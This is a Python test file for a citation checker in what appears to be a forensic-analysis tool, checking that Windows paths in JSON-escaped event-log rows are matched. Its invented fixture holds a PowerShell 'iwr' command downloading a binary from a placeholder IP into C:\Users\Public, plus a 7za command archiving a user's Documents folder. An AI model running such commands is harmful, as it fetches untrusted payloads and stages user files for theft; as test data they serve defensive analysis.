"""A value is cited when the evidence holds it in any form JSON writes it
(a Windows path's backslashes doubled, a non-ASCII letter as \\uXXXX), and
never through a decoding that turns a raw path into control characters.
Invented values in the shape of rendered event-log rows."""
from __future__ import annotations

import json

from core.execution_log import ExecutionLog
from tools._gates._citation import deterministic_cite_check, held_form

ROW = {"TimeCreated": "2031-03-10T13:59:20Z", "Computer": "CORP-WS02",
       "PayloadData1": "iwr http://203.0.113.50/k.bin -OutFile C:\\Users\\Public\\kit_tool.exe"}


def test_windows_paths_in_a_json_dumped_row_are_cited():
    ev = "[call 5] " + json.dumps(ROW, ensure_ascii=False)
    folder = "[call 6] " + json.dumps({"CommandLine": "7za.exe a C:\\Users\\Public\\out.7z "
                                                       "C:\\Users\\jane.doe\\Documents\\"})
    for statement in ("kit_tool.exe was written to C:\\Users\\Public\\kit_tool.exe.",
                      "The archive C:\\Users\\Public\\out.7z packed C:\\Users\\jane.doe\\Documents\\"):
        r = deterministic_cite_check(statement, ev + "\n" + folder)
        assert r["verdict"] == "ALL_CITED", r


def test_a_non_ascii_uppercase_value_meets_an_ascii_dump():
    ev = json.dumps({"FileName": "C:\\Daten\\Ärger.txt"})                 # ensure_ascii: \\u00c4
    assert deterministic_cite_check("C:\\Daten\\Ärger.txt was opened.", ev)["verdict"] == "ALL_CITED"


def test_decoding_never_turns_a_raw_path_into_control_characters():
    assert held_form("C:\\temp\\new", "c:\temp\new") == ""               # a tab and a line break: no path
    assert held_form("a\\nb", "a\nb") == ""
    assert held_form("C:\\new\\tool.exe", "c:\\new\\tool.exe")            # a raw path as written still holds
    copied = "C:\\\\Users\\\\Public"                                       # a model that copied the escaped form
    assert held_form(copied, "c:\\users\\public")


def test_a_value_absent_in_every_form_stays_uncited():
    r = deterministic_cite_check("Ran C:\\Windows\\Temp\\other.exe.", json.dumps(ROW))
    assert r["uncited_claims"] == ["C:\\Windows\\Temp\\other.exe"]


def test_the_auto_fill_finds_a_windows_path_in_a_json_tool_output(tmp_path):
    from unittest.mock import patch
    from tools.misc import _auto_fill_supporting_evidence
    log = ExecutionLog()
    log.configure("PJ1", str(tmp_path / "trace.json"), save_session=False)
    cid = log.record_tool_call("<py>:table_table_query", True, False, 0, 0,
                               stdout_excerpt=json.dumps({"rows": [ROW]}))
    with patch("core.execution_log.log", log):
        evidence, added = _auto_fill_supporting_evidence(
            description="kit_tool.exe was written to C:\\Users\\Public\\kit_tool.exe.",
            supporting_evidence="", input_call_ids=[cid], linked_call_id=cid, log=log)
    # the cited call's output holds it escaped: a citation line with the whole escaped form in its window
    assert added == [] and "C:\\\\Users\\\\Public\\\\kit_tool.exe" in evidence
    assert deterministic_cite_check("kit_tool.exe was written to C:\\Users\\Public\\kit_tool.exe.",
                                    evidence)["verdict"] == "ALL_CITED"
